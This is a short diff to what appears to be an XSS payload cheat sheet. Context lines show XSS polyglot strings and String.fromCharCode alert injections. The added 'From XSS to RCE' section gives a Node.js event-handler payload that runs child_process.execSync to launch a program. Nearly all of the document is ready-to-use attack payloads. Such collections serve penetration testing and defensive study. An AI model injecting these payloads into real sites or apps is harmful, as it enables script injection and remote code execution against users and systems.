@@ -32,4 +32,10 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</
 ```
 ';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))// →</SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
 ```
+### From XSS to RCE
 
+From xss to rce payload for nodejs application
+
+```
+<TagName EventHandler="require('child_process').execSync('calc.exe')">
+```
